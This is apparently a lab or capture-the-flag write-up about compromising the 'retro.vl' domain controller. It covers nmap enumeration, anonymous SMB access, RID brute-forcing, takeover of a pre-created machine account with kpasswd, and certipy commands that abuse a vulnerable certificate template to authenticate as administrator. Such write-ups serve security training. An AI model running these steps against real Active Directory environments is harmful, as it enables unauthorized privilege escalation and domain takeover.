# Enumeration
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-13 08:24:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2024-04-12T06:46:17
|_Not valid after:  2024-10-12T06:46:17
|_ssl-date: 2024-04-13T08:25:54+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   DNS_Tree_Name: retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-13T08:25:15+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
 Using smbmap we notice a share called Trainees accessible anonymously
![](attachment/7250721ec0c847f0ddf83273a7717ad1.png)
Accessing it there is a single file called Important.txt:
![](attachment/36a1412778810ceabe5b40649b2058af.png)
So trying an rid bruteforce to get usernames:
![](attachment/e8b6f4ef33cfb827cef394cdf724ee23.png)
Now trying trainee password we get a login![](attachment/80a397d505196157019b58f4b5014d7f.png)
Now we can access a share called Notes

And there is a note called todo.txt:
![](attachment/dc7b121c89f73f35ad7a85488c5cb808.png)
We have a precreated account.
![](attachment/01395260299602960c211b65bf067668.png)
It is banking

Now we can change password with *kpasswd*
Modify `/etc/krb5.conf`
![](attachment/ae88ffe504782acc75946fa43f01cdd9.png)
Now changing password with kpasswd:
![](attachment/bc14e95937dfa1a22e8270e84e6e4454.png)
![](attachment/098f252a335235d37f2afe4868b39558.png)
Now finding vulnerable certificates:
```
sudo certipy-ad find -u 'BANKING$' -p 'aditya123@' -dc-ip 10.10.96.55 -stdout -vulnerable
```
![](attachment/3b3309d2da2f9bff54472c8e356e1bd9.png)
Now requesting certificate:
```
sudo certipy-ad req -u 'BANKING$'@retro.vl -c 'retro-DC-CA' -target 'DC.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dc-ip 10.10.96.55 -key-size 4096 -debug
```
And authenticating:
```
certipy auth -pfx administrator.pfx -dc-ip 10.10.96.55  
```
![](attachment/2407302d152a5a703a4b95fb32e33734.png)